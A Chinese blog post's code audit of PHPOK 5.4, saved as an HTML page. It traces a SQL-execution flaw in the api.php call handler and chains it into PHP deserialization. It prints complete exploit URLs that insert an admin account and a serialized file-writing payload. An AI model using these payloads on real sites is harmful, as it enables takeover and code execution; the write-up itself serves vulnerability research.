@@ -1,0 +1,486 @@
+
+  <script type="text/javascript">
+    (function() {
+      var now = new Date();
+      var dayStr = 'Sat Apr 04 2020 08:00:00 GMT+0800 (GMT+08:00)';
+      var day = dayStr ? new Date(dayStr) : new Date();
+      var isMemorialDay = now.getFullYear() === day.getFullYear() && now.getMonth() === day.getMonth() && now.getDay()  === day.getDay();
+      if (isMemorialDay) {
+        if (document.all) {
+          window.style = 'html {     -webkit-filter: grayscale(100%); /* webkit */     -moz-filter: grayscale(100%); /* firefox */     -ms-filter: grayscale(100%); /* ie9 */     -o-filter: grayscale(100%); /* opera */     filter: grayscale(100%);     filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); filter:gray; /* ie9- */   }';
+          document.createStyleSheet('javascript:style');
+        } else {
+          var style = document.createElement('style');
+          style.type = 'text/css';
+          style.innerHTML = 'html {     -webkit-filter: grayscale(100%); /* webkit */     -moz-filter: grayscale(100%); /* firefox */     -ms-filter: grayscale(100%); /* ie9 */     -o-filter: grayscale(100%); /* opera */     filter: grayscale(100%);     filter:progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); filter:gray; /* ie9- */   }';
+          document.getElementsByTagName('HEAD').item(0).appendChild(style);
+        }
+      }
+    })();
+  </script>
+  <!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/icon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#1a1a1a">
+  <meta name="description" content="">
+  <meta name="author" content="CattyHitomi">
+  <meta name="keywords" content="">
+  <title>代码审计之PHPOK其二 - CattyHitomi</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>CattyHitomi</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">分类</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/1.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期日, 七月 26日 2020, 12:40 下午
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    887 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      4 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>代码审计系列</p>
+<a id="more"></a>
+<h2 id="审计版本"><a href="#审计版本" class="headerlink" title="审计版本"></a>审计版本</h2><p>PHPOK5.4</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p><code>/framework/api/call_control.php</code><br><img src="/images/image001.jpg" alt="1"><br>5.4版本在5.3版本的基础上进行了修补，对$data变量进行了过滤，来防止反序列化漏洞。<br>跟进$this-&gt;format()函数<br><img src="/images/image002.jpg" alt="1"><br>分析代码，发现$type值为safe，进入最后的switch控制语句：<br><img src="/images/image003.jpg" alt="1"><br>分析代码，发现对,‘,”,&lt;,&gt;进行了转义：<br>返回，发现依然进入phpok函数：<br><img src="/images/image004.jpg" alt="1"><br>跟进<br><img src="/images/image005.jpg" alt="1"><br>跟进<br><img src="/images/image006.jpg" alt="1"><br>发现phpok5.4版本在phpok5.3版本上仅仅做了一个过滤$data的修复，但是对动态调用并未做出处理，因此，还是可以在5.3版本的基础上进行绕过利用。</p>
+<p>在/framework/phpok_call.php重新寻找可利用函数：<br>发现_sql()函数，当中会对单双引号进行反转义<br><img src="/images/image007.jpg" alt="1"><br>相当于绕过之前format()函数的处理<br>跟进get_all()函数：<br><img src="/images/image008.jpg" alt="1"><br>发现一个sql执行点，跟进函数：<br><img src="/images/image009.jpg" alt="1"><br>可以看到，用户输入的sql语句被带入数据库进行执行。<br>因此，我们控制json_data数据的值，就可以动态调用_sql()函数</p>
+<h3 id="构造json数组"><a href="#构造json数组" class="headerlink" title="构造json数组"></a>构造json数组</h3><pre><code>http://localhost/5.4/api.php?c=call&amp;f=index&amp;data={&quot;m_picplayer&quot;:{&quot;site&quot;:1,&quot;type_id&quot;:&quot;sql&quot;,&quot;sqlinfo&quot;:&quot;INSERT INTO `phpok5_4`.`qinggan_adm`(`id`, `account`, `pass`, `email`, `status`, `if_system`, `vpass`, `fullname`, `close_tip`) VALUES (22,&#39;22&#39;,&#39;22&#39;,&#39;22&#39;,22,22,22,22,22)&quot;}}</code></pre><p>在管理员表里创建一个用户：<br><img src="/images/image010.jpg" alt="1"><br>成功创建：<br><img src="/images/image011.jpg" alt="1"><br>任意sql语句执行利用成功</p>
+<h3 id="从任意sql语句执行到反序列化"><a href="#从任意sql语句执行到反序列化" class="headerlink" title="从任意sql语句执行到反序列化"></a>从任意sql语句执行到反序列化</h3><p>在/framework/phpok_call.php文件中，存在另外一个函数：_fields()<br><img src="/images/image012.jpg" alt="1"><br>存在一处反序列化函数：<br><img src="/images/image013.jpg" alt="1"><br>跟踪unserialize()函数中的变量：$value[‘ext’]<br><img src="/images/image014.jpg" alt="1"><br><img src="/images/image015.jpg" alt="1"><br>可以发现，最终unserialize()函数中的参数可由用户控制<br>查看project_one()函数：<br><img src="/images/image016.jpg" alt="1"><br><img src="/images/image017.jpg" alt="1"><br>分析代码，此处为获取prefix.project表里的一条数据<br><img src="/images/image018.jpg" alt="1"><br>获取prefix.fields表里的所有数据<br>field表里的数据被带入$rslist返回给$flist，最终传入unserialize()函数。</p>
+<p>因此只要field表里的数据是一个序列化利用字符串，就可以被带入unserialize()函数，造成反序列化漏洞。</p>
+<p>同时上文可以得知，我们可以控制sql达到任意sql语句执行的目的，因此我们可以先控制sql语句执行，插入一条payload到field表中，再经过_field()函数将payload取出，带入unserialize()函数中，造成反序列化漏洞。</p>
+<h3 id="数据关系"><a href="#数据关系" class="headerlink" title="数据关系"></a>数据关系</h3><p>pid控制get_one()的数据。<br>返回的数据中的module值控制get_all()的值<br>get_all()中的ext传入unserialize()</p>
+<h3 id="构造Payload"><a href="#构造Payload" class="headerlink" title="构造Payload"></a>构造Payload</h3><pre><code>Payload1:
+http://localhost/5.4/api.php?c=call&amp;f=index&amp;data={&quot;m_picplayer&quot;:{&quot;site&quot;:1,&quot;type_id&quot;:&quot;sql&quot;,&quot;sqlinfo&quot;:&quot;INSERT INTO `phpok5_4`.`qinggan_project` VALUES (333,333,1,333,333,&#39;qweqwe&#39;,&#39;qweqwe&#39;,3,3,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,3,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,333,333,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,3,3,3,3,3,3,3,3,&#39;qwe&#39;,3,3,3,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,&#39;qwe&#39;,3,&#39;qwe&#39;,3,3,3,&#39;qwe&#39;,&#39;qwe&#39;,3,3)&quot;}}</code></pre><p><img src="/images/image019.jpg" alt="1"></p>
+<pre><code>payload2：
+http://localhost/5.4/api.php?c=call&amp;f=index&amp;data={&quot;m_picplayer&quot;:{&quot;site&quot;:1,&quot;type_id&quot;:&quot;sql&quot;,&quot;sqlinfo&quot;:&quot;INSERT INTO `phpok5_4`.`qinggan_fields`(`id`, `ftype`, `title`, `identifier`, `field_type`, `note`, `form_type`, `form_style`, `format`, `content`, `ext`, `search_separator`, `form_class`) VALUES (1234, &#39;333&#39;, &#39;test&#39;, &#39;test&#39;, &#39;varchar&#39;, &#39;test&#39;, &#39;text&#39;, &#39;test&#39;, &#39;safe&#39;, &#39;test&#39;, 0x4f3a353a226361636865223a333a7b733a393a22002a006b65795f6964223b733a35363a227068703a2f2f66696c7465722f77726974653d636f6e766572742e6261736536342d6465636f64652f7265736f757263653d717771777177223b733a31313a22002a006b65795f6c697374223b733a32363a2261615044397761484167634768776157356d627967704f7a382b223b733a393a22002a00666f6c646572223b733a303a22223b7d, &#39;test&#39;, &#39;test&#39;)&quot;}}</code></pre><p><img src="/images/image020.jpg" alt="1"></p>
+<pre><code>payload3：
+http://localhost/5.4/api.php?c=call&amp;f=index&amp;data={&quot;m_picplayer&quot;:{&quot;site&quot;:1,&quot;type_id&quot;:&quot;fields&quot;,&quot;pid&quot;:333}}</code></pre><p><img src="/images/image021.jpg" alt="1"><br>访问写入的phpinfo文件，成功写入：<br><img src="/images/image022.jpg" alt="1"></p>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PHPOK/">PHPOK</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BPHPOK%E5%85%B6%E4%B8%80/">
+                        <span class="hidden-mobile">代码审计之PHPOK其一</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><span style="color:white;"><i class="far fa-list-alt"></i>&nbsp;目录</span></p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: '.post-content',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc > p').css('visibility', 'visible');
+      }
+      var offset = boardCtn.css('margin-right')
+      $('#toc-ctn').css({
+        'right': offset
+      })
+    });
+  </script>
+
+
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+
+<!-- Plugins -->
+
+
+
+  <script  src="https://cdn.staticfile.org/prettify/188.0.0/prettify.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint  linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "代码审计之PHPOK其二&nbsp;",
+      ],
+      cursorChar: "",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+      icon: "#"
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      getSearchFile(path);
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <script>
+    $("#post img:not(.no-zoom img, img[no-zoom])").each(
+      function () {
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "images");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
